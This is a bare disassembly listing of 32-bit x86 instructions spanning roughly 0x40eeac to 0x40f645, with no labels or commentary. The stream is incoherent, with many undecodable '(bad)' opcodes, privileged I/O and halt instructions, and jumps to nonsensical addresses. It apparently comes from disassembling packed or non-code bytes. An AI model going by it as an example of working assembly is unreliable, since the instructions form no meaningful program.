  40eeac:	push   edi
  40eead:	sbb    esi,esp
  40eeaf:	jle    0x40ee4f
  40eeb1:	mov    WORD PTR [ebx+0x563b36ba],fs
  40eeb7:	fist   DWORD PTR [eax+0x14]
  40eeba:	or     BYTE PTR [ebx-0x31],al
  40eebd:	or     DWORD PTR ds:0x607a1dac,ebx
  40eec3:	mov    BYTE PTR [edx-0x2d],bl
  40eec6:	les    ebp,FWORD PTR [eax+0x20992c71]
  40eecc:	cwde   
  40eecd:	xchg   ecx,eax
  40eece:	loopne 0x40ee7d
  40eed0:	sub    ah,ch
  40eed2:	adc    al,0xa1
  40eed4:	xchg   esi,eax
  40eed5:	sub    DWORD PTR [ecx+0x0],edi
  40eed8:	jl     0x40eee0
  40eeda:	jp     0x40ee89
  40eedc:	aaa    
  40eedd:	jg     0x40ee9c
  40eedf:	push   esi
  40eee0:	mov    DWORD PTR [eax+0x632a4e65],esp
  40eee6:	test   al,0x8c
  40eee8:	inc    ecx
  40eee9:	push   esi
  40eeea:	int3   
  40eeeb:	ficomp WORD PTR [edi-0x65c39f6b]
  40eef1:	mov    dh,0xbe
  40eef3:	ins    DWORD PTR es:[edi],dx
  40eef4:	ins    BYTE PTR es:[edi],dx
  40eef5:	mov    ebp,0x7b35673e
  40eefa:	daa    
  40eefb:	stos   BYTE PTR es:[edi],al
  40eefc:	adc    al,0x62
  40eefe:	or     ch,dl
  40ef00:	mov    edx,DWORD PTR [esi+0x30bb8cf9]
  40ef06:	mov    al,ds:0xe41fad61
  40ef0b:	ja     0x40eec6
  40ef0d:	push   edi
  40ef0e:	inc    esi
  40ef0f:	sbb    DWORD PTR [esi],ebx
  40ef11:	push   esp
  40ef12:	sbb    eax,0xaa121eab
  40ef17:	mov    edi,0xf8fb1de9
  40ef1c:	pop    eax
  40ef1d:	jne    0x40ef21
  40ef1f:	xor    ecx,eax
  40ef21:	jb     0x40ef69
  40ef23:	add    BYTE PTR [edi-0x69efa773],bh
  40ef29:	jge    0x40efa7
  40ef2b:	outs   dx,BYTE PTR ds:[esi]
  40ef2c:	mov    dl,0xa0
  40ef2e:	lock lea edi,[ebp+0x7a3b741c]
  40ef35:	aaa    
  40ef36:	mov    ebx,0x66c25983
  40ef3b:	neg    BYTE PTR [eax]
  40ef3d:	dec    edi
  40ef3e:	and    BYTE PTR [ebp+0xd],dh
  40ef41:	scas   eax,DWORD PTR es:[edi]
  40ef42:	xchg   esp,eax
  40ef43:	xor    DWORD PTR [esi-0xe3a42a1],0xffffffa2
  40ef4a:	xchg   edx,eax
  40ef4b:	lds    edi,FWORD PTR [esi+0x30]
  40ef4e:	sbb    dh,BYTE PTR [ebx+edx*4+0x6f439a8]
  40ef55:	xchg   edi,ecx
  40ef57:	sbb    eax,0x941a94c4
  40ef5c:	inc    edi
  40ef5d:	(bad)  
  40ef5e:	popa   
  40ef5f:	dec    esi
  40ef60:	imul   eax,DWORD PTR [ebx-0x27742636],0x617c6058
  40ef6a:	lods   eax,DWORD PTR ds:[esi]
  40ef6b:	(bad)  
  40ef6c:	fisub  DWORD PTR [esi+0x7314b1b9]
  40ef72:	call   0x88333409
  40ef77:	test   DWORD PTR [ebx-0x13],edx
  40ef7a:	jmp    0x40ef7a
  40ef7c:	daa    
  40ef7d:	out    dx,eax
  40ef7e:	add    BYTE PTR [ebx],0xe9
  40ef81:	or     DWORD PTR [ebx+edi*4+0x62],edx
  40ef85:	mov    bh,0xc9
  40ef87:	out    0x42,al
  40ef89:	lahf   
  40ef8a:	test   BYTE PTR [eax+esi*8+0x40],al
  40ef8e:	lock fnstenv [bx]
  40ef92:	(bad)  
  40ef93:	cld    
  40ef94:	jo     0x40f00d
  40ef96:	cdq    
  40ef97:	mov    edx,0x91ac1660
  40ef9c:	aas    
  40ef9d:	nop
  40ef9e:	cmp    DWORD PTR [ebp+0x2c],ebx
  40efa1:	pop    ecx
  40efa2:	add    ebx,DWORD PTR [edx-0x558d1fd9]
  40efa8:	rol    bl,1
  40efaa:	rol    DWORD PTR [edx],0x13
  40efad:	inc    ebx
  40efae:	pop    ecx
  40efaf:	not    edx
  40efb1:	mov    ds:0x542c2005,al
  40efb6:	jb     0x40efab
  40efb8:	add    BYTE PTR [ecx+ebx*4-0x3f6c7fd9],dh
  40efbf:	mov    ds:0x3361c6e6,eax
  40efc4:	and    edi,DWORD PTR [ecx+ebp*1]
  40efc7:	inc    ebp
  40efc8:	dec    ecx
  40efc9:	lahf   
  40efca:	xor    DWORD PTR [esp+eax*8+0x8],0xb3d03bd3
  40efd2:	adc    BYTE PTR [edi+0x5d],bh
  40efd5:	mov    ecx,0x9e32773e
  40efda:	fs test eax,0xcd538490
  40efe0:	mov    eax,fs
  40efe2:	imul   ecx,DWORD PTR [edx-0x6b130381],0xffffff85
  40efe9:	into   
  40efea:	jle    0x40efd4
  40efec:	dec    edx
  40efed:	inc    esp
  40efee:	adc    BYTE PTR [ebx-0x5eff2c1],cl
  40eff4:	mov    WORD PTR [esi],ss
  40eff6:	out    dx,al
  40eff7:	fld    DWORD PTR [esp+edi*1]
  40effa:	ret    0x3953
  40effd:	pop    ebp
  40effe:	adc    DWORD PTR [esi-0x6e],ebp
  40f001:	and    BYTE PTR [eax-0x55fa72f1],0xc8
  40f008:	das    
  40f009:	sub    ebx,edi
  40f00b:	outs   dx,DWORD PTR ds:[esi]
  40f00c:	inc    eax
  40f00d:	call   0xfe4a0600
  40f012:	adc    dl,dl
  40f014:	jns    0x40f00b
  40f016:	or     edi,ebp
  40f018:	retf   0x64f
  40f01b:	push   ebx
  40f01c:	dec    ecx
  40f01d:	mov    ah,0x9e
  40f01f:	mov    eax,ds:0x3db8b2a7
  40f024:	add    BYTE PTR [ebx+0x2ab64530],bh
  40f02a:	push   cs
  40f02b:	rcl    BYTE PTR [edi],cl
  40f02d:	add    al,0x14
  40f02f:	jg     0x40f000
  40f031:	rcl    BYTE PTR [edi+0x5f],1
  40f034:	add    dl,BYTE PTR [eax+0x5c]
  40f037:	test   eax,0x6b139f16
  40f03c:	(bad)  
  40f03d:	fiadd  DWORD PTR [eax+0x57]
  40f040:	adc    edi,ecx
  40f042:	inc    edx
  40f043:	ss and eax,0x920bf213
  40f049:	ret    
  40f04a:	push   eax
  40f04b:	les    esi,FWORD PTR [edx+0x2db49c1b]
  40f051:	call   ecx
  40f053:	lods   eax,DWORD PTR ds:[esi]
  40f054:	and    al,0x29
  40f056:	ja     0x40f01c
  40f058:	dec    edi
  40f059:	push   edx
  40f05a:	and    DWORD PTR [esi-0x80],0x23
  40f05e:	xchg   ebp,eax
  40f05f:	jg     0x40f08d
  40f061:	push   0xfa3b3165
  40f066:	enter  0xf834,0xeb
  40f06a:	arpl   dx,si
  40f06c:	xor    DWORD PTR [ecx+0x5430ac54],eax
  40f072:	idiv   DWORD PTR [esi+0x698e5e2]
  40f078:	xlat   BYTE PTR ds:[ebx]
  40f079:	dec    edx
  40f07a:	mov    ss,edx
  40f07c:	das    
  40f07d:	cdq    
  40f07e:	push   edi
  40f07f:	(bad)  
  40f080:	mov    dl,0xd8
  40f082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f083:	js     0x40f0f0
  40f085:	jb     0x40f031
  40f087:	inc    eax
  40f088:	jno    0x40f0ce
  40f08a:	dec    ecx
  40f08b:	lahf   
  40f08c:	clc    
  40f08d:	xor    esi,esi
  40f08f:	not    BYTE PTR [esi]
  40f091:	enter  0x3938,0xf4
  40f095:	jp     0x40f053
  40f097:	daa    
  40f098:	(bad)  
  40f099:	popa   
  40f09a:	jg     0x40f0fd
  40f09c:	mov    ebx,0x47357e92
  40f0a1:	(bad)  
  40f0a3:	ins    DWORD PTR es:[edi],dx
  40f0a4:	jp     0x40f119
  40f0a6:	mov    ebx,DWORD PTR [ecx]
  40f0a8:	sub    ch,BYTE PTR [eax+0x1b]
  40f0ab:	or     DWORD PTR [ebx-0x49],edx
  40f0ae:	and    DWORD PTR [ecx+0x4a],esi
  40f0b1:	xchg   ebx,eax
  40f0b2:	cmc    
  40f0b3:	mov    ecx,0xef28d093
  40f0b8:	pop    ecx
  40f0b9:	xchg   ebx,eax
  40f0ba:	jno    0x40f044
  40f0bc:	add    ch,cl
  40f0be:	repnz or cl,BYTE PTR [esi]
  40f0c1:	mov    ds:0x83229dcf,al
  40f0c6:	fs inc esi
  40f0c8:	fild   QWORD PTR [ebp-0x4d64dc1a]
  40f0ce:	loop   0x40f09c
  40f0d0:	pop    edi
  40f0d1:	push   edi
  40f0d2:	cmp    al,0x54
  40f0d5:	mov    cl,0xca
  40f0d7:	imul   eax,DWORD PTR [edi-0x58397ec6],0x2c
  40f0de:	adc    eax,0xd196b171
  40f0e3:	cmp    ebp,eax
  40f0e5:	push   ebp
  40f0e6:	dec    edi
  40f0e7:	jge    0x40f0a2
  40f0e9:	dec    eax
  40f0ea:	ins    BYTE PTR es:[edi],dx
  40f0eb:	fwait
  40f0ec:	mov    ebp,0xc65769f5
  40f0f1:	mov    bl,0x31
  40f0f3:	nop
  40f0f4:	dec    esp
  40f0f5:	int3   
  40f0f6:	jl     0x40f096
  40f0f8:	popa   
  40f0f9:	sahf   
  40f0fa:	sub    DWORD PTR [edi],0xffffffcb
  40f0fd:	adc    al,bl
  40f0ff:	ds aad 0x3d
  40f102:	xor    al,0xbf
  40f104:	arpl   sp,ax
  40f106:	sbb    eax,0x81d9077d
  40f10b:	gs ja  0x40f12e
  40f10e:	or     eax,0x26233914
  40f113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f114:	dec    esp
  40f115:	pop    ecx
  40f116:	ret    0xf571
  40f119:	mov    al,0xf0
  40f11b:	out    0xfe,al
  40f11d:	adc    eax,0x679d09e6
  40f122:	xchg   DWORD PTR [ebx-0x1d9ed571],edi
  40f128:	jge    0x40f186
  40f12a:	sahf   
  40f12b:	aas    
  40f12c:	mov    bl,al
  40f12e:	das    
  40f12f:	or     edx,DWORD PTR [edi-0x6f5618dd]
  40f135:	push   0x43314c96
  40f13a:	hlt    
  40f13b:	xchg   edx,eax
  40f13c:	fist   WORD PTR [edx]
  40f13e:	dec    ebp
  40f13f:	push   esi
  40f140:	clc    
  40f141:	sub    BYTE PTR [edi+ebp*2+0x4c1ee223],0x48
  40f149:	and    al,0x4c
  40f14b:	out    0x83,al
  40f14d:	imul   edx,DWORD PTR [edi],0x63
  40f150:	lock mov WORD PTR [ebp-0x4e],?
  40f154:	xor    ebp,DWORD PTR ds:[edx-0x4dd3ab6f]
  40f15b:	pop    ss
  40f15c:	jmp    0x67a7:0xfe926ff7
  40f163:	inc    esp
  40f164:	sbb    BYTE PTR [edi+0x1cebcde5],al
  40f16a:	lods   eax,DWORD PTR ds:[esi]
  40f16b:	lahf   
  40f16c:	push   cs
  40f16d:	cmp    ebp,DWORD PTR [eax]
  40f16f:	clc    
  40f170:	data16 clc 
  40f172:	cmp    eax,0x9edcf515
  40f177:	shl    BYTE PTR [ecx+0x46],cl
  40f17a:	jle    0x40f197
  40f17c:	fsub   st(7),st
  40f17e:	pop    eax
  40f17f:	jle    0x40f187
  40f181:	test   eax,0xc81a5640
  40f186:	or     BYTE PTR [edi-0x1c9d8ff9],0x27
  40f18d:	ret    
  40f18e:	mov    esi,DWORD PTR [edx]
  40f190:	retf   0x6112
  40f193:	shr    BYTE PTR [esi],1
  40f195:	or     dh,BYTE PTR [edi]
  40f197:	xchg   edx,eax
  40f198:	jno    0x40f186
  40f19a:	aaa    
  40f19b:	dec    eax
  40f19c:	(bad)  
  40f19d:	mov    ds:0x214bb2c4,eax
  40f1a2:	ins    BYTE PTR es:[edi],dx
  40f1a3:	out    dx,eax
  40f1a4:	sbb    al,0x7f
  40f1a6:	or     BYTE PTR [ebp-0x4f],ch
  40f1a9:	cld    
  40f1aa:	shl    BYTE PTR [eax],cl
  40f1ac:	daa    
  40f1ad:	dec    eax
  40f1ae:	mov    ds:0x680641b7,al
  40f1b3:	push   ebp
  40f1b4:	popf   
  40f1b5:	mov    esp,0x23e213a3
  40f1ba:	sahf   
  40f1bb:	and    DWORD PTR [edx+0x13],edx
  40f1be:	out    dx,al
  40f1bf:	sbb    BYTE PTR [edx+0x11],0xa8
  40f1c3:	jo     0x40f162
  40f1c5:	and    eax,DWORD PTR [edi]
  40f1c7:	adc    edi,ebp
  40f1c9:	xor    al,0xd3
  40f1cb:	call   0x2801c087
  40f1d0:	call   0x5776:0xba832ac3
  40f1d7:	xchg   ebx,eax
  40f1d8:	mov    dl,0xaf
  40f1da:	iret   
  40f1db:	xor    ebx,ebp
  40f1dd:	jle    0x40f163
  40f1df:	dec    esp
  40f1e0:	(bad)  
  40f1e1:	push   edx
  40f1e2:	sub    esp,DWORD PTR [ebp-0x1e]
  40f1e5:	mov    DWORD PTR [edx],esi
  40f1e7:	pop    edx
  40f1e8:	pop    ecx
  40f1e9:	jg     0x40f1f4
  40f1eb:	sub    al,0x3d
  40f1ed:	jp     0x40f264
  40f1ef:	call   0xd2abcf8
  40f1f4:	hlt    
  40f1f5:	popf   
  40f1f6:	pop    ecx
  40f1f7:	ss push ss
  40f1f9:	jno    0x40f203
  40f1fb:	enter  0xfa37,0xbd
  40f1ff:	push   edi
  40f200:	stos   BYTE PTR es:[edi],al
  40f201:	add    al,0x1f
  40f203:	fstp   DWORD PTR [eax-0x27]
  40f206:	(bad)  
  40f207:	and    eax,0x92ab836f
  40f20c:	je     0x40f21a
  40f20e:	popf   
  40f20f:	xchg   edi,eax
  40f210:	jmp    0xa24:0xf5afba03
  40f217:	dec    eax
  40f218:	mov    ebp,0x3ff8b29b
  40f21d:	dec    edi
  40f21e:	test   eax,0xc08f275e
  40f223:	adc    esi,ebx
  40f225:	xlat   BYTE PTR ds:[ebx]
  40f226:	inc    edx
  40f227:	or     ebx,DWORD PTR [ebx]
  40f229:	push   0xc20394b4
  40f22e:	pop    ds
  40f22f:	fwait
  40f230:	lods   al,BYTE PTR ds:[esi]
  40f231:	das    
  40f232:	inc    ebx
  40f233:	dec    esp
  40f234:	and    eax,0xe326c442
  40f239:	xchg   edi,eax
  40f23a:	addr16 push ebp
  40f23c:	mov    dh,0x36
  40f23e:	mov    edi,0x85a370bd
  40f243:	shl    ebx,cl
  40f245:	mov    ds:0xb30b3af,eax
  40f24a:	imul   ecx,DWORD PTR [esi-0x4e875855],0x24
  40f251:	jp     0x40f1d8
  40f253:	push   eax
  40f254:	stos   DWORD PTR es:[edi],eax
  40f255:	leave  
  40f256:	(bad)  
  40f257:	not    BYTE PTR [eax+0x3f9c9f89]
  40f25d:	push   es
  40f25e:	stos   DWORD PTR es:[edi],eax
  40f25f:	inc    eax
  40f260:	sbb    DWORD PTR [ebp-0x53ec2cd1],edi
  40f266:	cmp    al,0x17
  40f268:	outs   dx,BYTE PTR ds:[esi]
  40f269:	in     al,dx
  40f26a:	jmp    0x4f0857f6
  40f26f:	adc    eax,0x19ec1cba
  40f274:	dec    ecx
  40f275:	mov    ch,0xb0
  40f277:	jnp    0x40f2c7
  40f279:	xor    dh,BYTE PTR [edi]
  40f27b:	mov    ds:0x5e005736,al
  40f280:	push   es
  40f281:	and    eax,0x897c6c42
  40f286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f287:	test   DWORD PTR ds:0xc5e4a575,ecx
  40f28d:	jae    0x40f228
  40f28f:	mov    ds:0x989e2e66,al
  40f294:	fwait
  40f295:	adc    dh,ch
  40f297:	sbb    eax,0x195146f9
  40f29c:	and    edx,DWORD PTR [ecx-0xb]
  40f29f:	retf   0x2aa2
  40f2a2:	popa   
  40f2a3:	xor    DWORD PTR [eax-0x7f],eax
  40f2a6:	sub    DWORD PTR [ebp-0x51],eax
  40f2a9:	leave  
  40f2aa:	inc    ebp
  40f2ab:	int3   
  40f2ac:	test   al,0x8c
  40f2ae:	jl     0x40f278
  40f2b0:	sbb    DWORD PTR [edi],ecx
  40f2b2:	ss in  eax,0x21
  40f2b5:	mov    dl,0x2f
  40f2b7:	loop   0x40f2a5
  40f2b9:	stc    
  40f2ba:	nop
  40f2bb:	ret    0xbcdd
  40f2be:	push   cs
  40f2bf:	sbb    eax,0x922edbac
  40f2c4:	sub    DWORD PTR [edx],0x19
  40f2c7:	pop    ss
  40f2c8:	jb     0x40f2e6
  40f2ca:	mov    eax,0x6d0efc47
  40f2cf:	pop    esp
  40f2d0:	xor    ch,dl
  40f2d2:	scas   eax,DWORD PTR es:[edi]
  40f2d3:	inc    esp
  40f2d4:	ficom  WORD PTR gs:[esi+0x13]
  40f2d8:	jb     0x40f2e8
  40f2da:	je     0x40f310
  40f2dc:	les    esp,FWORD PTR [eax+0x4a]
  40f2df:	sub    BYTE PTR [ecx+0x6a5f5e86],0x32
  40f2e6:	arpl   di,si
  40f2e8:	lahf   
  40f2e9:	jl     0x40f2aa
  40f2eb:	test   eax,0xba4dd84a
  40f2f0:	mov    al,ds:0x32974674
  40f2f6:	push   ds
  40f2f7:	jb     0x40f365
  40f2f9:	sub    ebp,DWORD PTR [edi-0x9e6b983]
  40f2ff:	mov    ecx,0xe343f271
  40f304:	retf   
  40f305:	call   0x583e:0x7f58e405
  40f30c:	dec    edx
  40f30d:	mov    ds:0x1eb86182,al
  40f312:	into   
  40f313:	fwait
  40f314:	sbb    al,0xee
  40f316:	dec    ecx
  40f317:	xchg   esp,eax
  40f318:	push   edi
  40f319:	lods   al,BYTE PTR ds:[esi]
  40f31a:	sar    DWORD PTR [edi+0x17f27173],1
  40f320:	add    ebp,esi
  40f322:	cwde   
  40f323:	ins    DWORD PTR es:[edi],dx
  40f324:	popf   
  40f325:	sti    
  40f326:	gs call 0x5a28:0x7f24411e
  40f32e:	xchg   edx,eax
  40f32f:	popf   
  40f330:	pop    edx
  40f331:	cmp    al,0x30
  40f333:	xchg   edi,eax
  40f334:	mov    eax,ds:0x61ddc5d5
  40f339:	retf   0x1d20
  40f33c:	push   ecx
  40f33d:	and    DWORD PTR [esp+eax*8-0x7688cbfd],ecx
  40f344:	pop    ecx
  40f345:	or     eax,edi
  40f347:	jle    0x40f326
  40f349:	mov    bl,0x74
  40f34b:	mov    ecx,0xab6e18ba
  40f350:	dec    esp
  40f351:	cmp    DWORD PTR ds:0xc44dad1c,ebp
  40f357:	sbb    bl,al
  40f359:	ror    BYTE PTR [edi+0x341faf97],0x9
  40f360:	sbb    esp,DWORD PTR [ebp+0x65]
  40f363:	dec    edx
  40f364:	psadbw mm7,QWORD PTR [ebx]
  40f367:	lock (bad) 
  40f369:	xor    ebx,DWORD PTR [eax-0xbfc3e28]
  40f36f:	xchg   BYTE PTR [ebx+0x282e8ce5],ch
  40f375:	sub    cl,BYTE PTR [eax+ebp*1-0x7f]
  40f379:	cmp    eax,0x8bf1f1cd
  40f37e:	sbb    al,0x5
  40f380:	push   esp
  40f381:	jmp    0xacfc920a
  40f386:	in     eax,dx
  40f387:	fsqrt  
  40f389:	pop    esi
  40f38a:	and    eax,0x60066a57
  40f38f:	cdq    
  40f390:	push   esi
  40f391:	mov    al,cs:0x30c5548c
  40f397:	out    dx,al
  40f398:	rcl    bh,1
  40f39a:	xchg   ebx,eax
  40f39b:	not    BYTE PTR [eax-0x41]
  40f39e:	and    al,0xe7
  40f3a0:	into   
  40f3a1:	jmp    0x70c:0xe88397d2
  40f3a8:	(bad)  
  40f3aa:	xchg   ebx,eax
  40f3ab:	and    DWORD PTR [eax],esp
  40f3ad:	push   0x52
  40f3af:	(bad)  
  40f3b0:	and    cx,WORD PTR [esi+0x460d53a0]
  40f3b7:	fst    DWORD PTR [ebx+0xad7a1c3]
  40f3bd:	in     al,0x5d
  40f3bf:	mov    ds:0xd7fe0b8e,al
  40f3c4:	or     ebx,eax
  40f3c6:	pop    esp
  40f3c7:	and    al,0x2
  40f3c9:	lds    edi,FWORD PTR [eax]
  40f3cb:	lea    edi,[ecx-0x7b]
  40f3ce:	and    edi,DWORD PTR [eax+ecx*1+0x6c3ad9d0]
  40f3d5:	out    dx,al
  40f3d6:	xchg   BYTE PTR [ebx+0x3f9e4a93],al
  40f3dc:	sbb    edi,DWORD PTR [esi]
  40f3de:	cmp    esi,DWORD PTR [eax]
  40f3e0:	sub    ah,cl
  40f3e2:	into   
  40f3e3:	(bad)  
  40f3e4:	add    ecx,ebx
  40f3e6:	out    dx,al
  40f3e7:	mov    ch,0x22
  40f3e9:	cmp    eax,0xf03da8f3
  40f3ee:	inc    eax
  40f3ef:	dec    ecx
  40f3f0:	sbb    al,0xc7
  40f3f2:	clc    
  40f3f3:	(bad)  
  40f3f4:	cmp    DWORD PTR [edi],ecx
  40f3f6:	arpl   bp,sp
  40f3f8:	cli    
  40f3f9:	lods   al,BYTE PTR ds:[esi]
  40f3fa:	sub    al,0x64
  40f3fc:	retf   0xb37a
  40f3ff:	test   eax,0x7db4886b
  40f404:	ja     0x40f404
  40f406:	xlat   BYTE PTR ds:[ebx]
  40f407:	ss pop ecx
  40f409:	je     0x40f405
  40f40b:	adc    DWORD PTR [esi-0x70345ac1],edi
  40f411:	or     al,0xda
  40f413:	dec    ebx
  40f414:	mov    ecx,0xdb08ebd3
  40f419:	daa    
  40f41a:	cwde   
  40f41b:	pop    edi
  40f41c:	xchg   ecx,eax
  40f41d:	dec    ebx
  40f41e:	ins    BYTE PTR es:[edi],dx
  40f41f:	and    ecx,0xbf6a2073
  40f425:	jno    0x40f42f
  40f427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f428:	leave  
  40f429:	add    DWORD PTR [edi+0x32],eax
  40f42c:	lea    esi,[esi+0x21cfeedd]
  40f432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f433:	(bad)  
  40f434:	mov    ecx,0x56793454
  40f439:	cmp    BYTE PTR [edx+0x3d719b3],ch
  40f43f:	sub    DWORD PTR [esi+0x16a9b156],ecx
  40f445:	leave  
  40f446:	dec    ebx
  40f447:	mov    dl,bh
  40f449:	push   eax
  40f44a:	outs   dx,BYTE PTR ds:[esi]
  40f44b:	rol    BYTE PTR ds:0xc03ee5cf,1
  40f451:	and    al,0x7
  40f453:	call   esp
  40f455:	in     eax,dx
  40f456:	add    al,0x6f
  40f458:	sahf   
  40f459:	cmp    esi,DWORD PTR [esi]
  40f45b:	push   ecx
  40f45c:	sbb    eax,0xe066fdea
  40f461:	fs cld 
  40f463:	lods   eax,DWORD PTR ds:[esi]
  40f464:	int3   
  40f465:	cmp    eax,DWORD PTR [ecx+0x55]
  40f468:	or     bh,BYTE PTR [eax-0x255ba559]
  40f46e:	add    bh,BYTE PTR [eax+0x28]
  40f471:	ret    
  40f472:	adc    eax,0x963af478
  40f477:	test   al,cl
  40f479:	popa   
  40f47a:	dec    edx
  40f47b:	and    dl,al
  40f47d:	sbb    DWORD PTR [ebp-0x27],edx
  40f480:	mov    edx,0x1bebe9fc
  40f485:	iret   
  40f486:	jp     0x40f4dd
  40f488:	add    DWORD PTR [esi-0x57],edi
  40f48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f48c:	lock cmp eax,0x99cdd17
  40f492:	arpl   dx,sp
  40f494:	pop    ecx
  40f495:	jne    0x40f4d0
  40f497:	xlat   BYTE PTR ds:[ebx]
  40f498:	aam    0x69
  40f49a:	pop    edi
  40f49b:	mov    al,0x54
  40f49d:	mov    ds:0x61e8df18,eax
  40f4a2:	jnp    0x40f425
  40f4a4:	sub    bl,BYTE PTR [edx]
  40f4a6:	in     eax,0x33
  40f4a8:	push   ebp
  40f4a9:	adc    BYTE PTR [esp+edx*1+0x4adf2aa],dh
  40f4b0:	mov    esp,0x16b16b32
  40f4b5:	sbb    al,0xf1
  40f4b7:	stos   BYTE PTR es:[edi],al
  40f4b8:	xor    ecx,DWORD PTR ds:0x35ab03b2
  40f4be:	push   es
  40f4bf:	and    edi,edi
  40f4c1:	rol    esp,0x6b
  40f4c4:	xor    BYTE PTR [ecx-0x339d7c5c],bl
  40f4ca:	add    al,0xd1
  40f4cc:	popa   
  40f4cd:	mov    cl,0xf6
  40f4cf:	sbb    DWORD PTR [ebx-0x6a],eax
  40f4d2:	pop    es
  40f4d3:	mov    ss,WORD PTR ds:[eax]
  40f4d6:	inc    edi
  40f4d7:	je     0x40f46a
  40f4d9:	imul   esp,DWORD PTR [ecx+0x7e],0x11
  40f4dd:	mov    ah,ah
  40f4df:	mov    WORD PTR [ecx],ss
  40f4e1:	jne    0x40f4e8
  40f4e3:	cld    
  40f4e4:	nop
  40f4e5:	add    eax,0xffffffcc
  40f4e8:	jne    0x40f48f
  40f4ea:	or     ecx,edx
  40f4ec:	lods   eax,DWORD PTR ds:[esi]
  40f4ed:	sub    DWORD PTR [ebx+0x4e296518],0xdc5a7477
  40f4f7:	mov    bh,0x6f
  40f4f9:	or     BYTE PTR [edx],ah
  40f4fb:	add    DWORD PTR [ebp-0xf],ecx
  40f4fe:	fwait
  40f4ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f500:	stos   BYTE PTR es:[edi],al
  40f501:	cli    
  40f502:	mov    eax,ds:0x590eeb8d
  40f507:	push   ebx
  40f508:	cmp    eax,0xe10245c
  40f50d:	mov    esp,0x70ab186a
  40f512:	dec    ebx
  40f513:	enter  0x1d66,0xc4
  40f517:	call   ebx
  40f519:	add    bh,BYTE PTR [esi+ebx*1+0x62]
  40f51d:	sbb    BYTE PTR [esi+0x2b1666a9],cl
  40f523:	retf   0xd330
  40f526:	mov    es,WORD PTR [esi-0x13]
  40f529:	pop    eax
  40f52a:	push   ebp
  40f52b:	or     eax,DWORD PTR ds:0x5618bd84
  40f531:	ins    BYTE PTR es:[edi],dx
  40f532:	cmc    
  40f533:	sub    eax,0xc07ac9ce
  40f538:	(bad)  
  40f539:	arpl   sp,si
  40f53b:	ja     0x40f511
  40f53d:	es pop ss
  40f53f:	and    DWORD PTR [edi],ecx
  40f541:	jp     0x40f512
  40f543:	xchg   ecx,eax
  40f544:	cmp    ah,BYTE PTR [ecx+0x35ff52f5]
  40f54a:	loope  0x40f4f4
  40f54c:	pop    es
  40f54d:	push   edi
  40f54e:	or     esi,eax
  40f550:	cld    
  40f551:	dec    ecx
  40f552:	xchg   ebx,eax
  40f553:	iret   
  40f554:	add    DWORD PTR ds:[ebx-0x16],esi
  40f558:	les    eax,FWORD PTR [edx+0x53]
  40f55b:	or     BYTE PTR [ecx],0xcc
  40f55e:	outs   dx,BYTE PTR ds:[esi]
  40f55f:	aad    0x1d
  40f561:	aam    0x59
  40f563:	jmp    0x40f597
  40f565:	xchg   ecx,eax
  40f566:	imul   edx,edi,0x24a938b0
  40f56c:	jb     0x40f5b0
  40f56e:	and    al,0x93
  40f570:	mov    BYTE PTR [ecx+0x74],dl
  40f573:	jge    0x40f5d9
  40f575:	in     eax,dx
  40f576:	xor    eax,0x9d94180b
  40f57b:	inc    ecx
  40f57c:	xchg   ecx,eax
  40f57d:	nop
  40f57e:	lea    esi,[edx-0x19cb871f]
  40f584:	pushf  
  40f585:	push   ebx
  40f586:	jae    0x40f5de
  40f588:	(bad)  
  40f589:	call   0x8f7b9b4
  40f58e:	retf   
  40f58f:	mov    al,ds:0x565ad34
  40f595:	xchg   edi,eax
  40f596:	pop    ebx
  40f597:	dec    eax
  40f598:	sub    bh,BYTE PTR [esi+0x32eb8b6c]
  40f59e:	js     0x40f588
  40f5a0:	fmulp  st(2),st
  40f5a2:	add    eax,0xa389e763
  40f5a7:	mov    cl,0xa9
  40f5a9:	sar    BYTE PTR [esi+ebp*2+0x370b358d],1
  40f5b0:	mov    al,0xab
  40f5b2:	pop    eax
  40f5b3:	jne    0x40f54f
  40f5b5:	mov    ebx,0xbab45177
  40f5ba:	xor    al,BYTE PTR [eax+0x747d0c35]
  40f5c0:	push   0x27
  40f5c2:	xor    cl,dh
  40f5c4:	dec    esp
  40f5c5:	and    bl,bh
  40f5c7:	push   edx
  40f5c8:	dec    ecx
  40f5c9:	int    0x89
  40f5cb:	xor    bh,BYTE PTR [ebx+edi*1-0x12ef604]
  40f5d2:	or     DWORD PTR ds:0x8d760f2a,esi
  40f5d8:	out    0xa1,eax
  40f5da:	lock fst DWORD PTR [eax]
  40f5dd:	retf   
  40f5de:	lods   al,BYTE PTR ds:[esi]
  40f5df:	aam    0xe
  40f5e1:	inc    ebp
  40f5e2:	mov    ah,0x14
  40f5e4:	hlt    
  40f5e5:	push   cs
  40f5e6:	mov    eax,0x83891797
  40f5eb:	fist   WORD PTR [ebp+0x416805b9]
  40f5f1:	and    al,0xe
  40f5f3:	mov    ebp,0x476c234c
  40f5f8:	cmp    al,0x2
  40f5fa:	jns    0x40f57c
  40f5fc:	or     esp,esp
  40f5fe:	and    eax,0x63fca55f
  40f603:	ret    
  40f604:	aaa    
  40f605:	jl     0x40f607
  40f607:	and    al,0xe6
  40f609:	scas   eax,DWORD PTR es:[edi]
  40f60a:	pop    edi
  40f60b:	or     al,0x99
  40f60d:	aas    
  40f60e:	xchg   DWORD PTR [edx+0x787352a0],edx
  40f614:	xor    al,0x42
  40f616:	jno    0x40f646
  40f618:	in     eax,0x9c
  40f61a:	ret    0x8f39
  40f61d:	iret   
  40f61e:	or     al,0xc3
  40f620:	mov    ebp,0xee0b71d3
  40f625:	push   ebp
  40f626:	(bad)  
  40f628:	xchg   BYTE PTR [ecx+0x46],bl
  40f62b:	xor    al,0xb4
  40f62d:	adc    al,BYTE PTR [edx]
  40f62f:	sub    DWORD PTR ds:0xe2d19d19,0xffffffd3
  40f636:	scas   al,BYTE PTR es:[edi]
  40f637:	cmp    BYTE PTR [eax+edx*4],dh
  40f63a:	test   eax,0x735b291
  40f63f:	cwde   
  40f640:	cmp    esi,esi
  40f642:	inc    edi
  40f643:	ja     0x40f603
  40f645:	xor    ch,BYTE PTR [edx+ebp*8+0x5b]
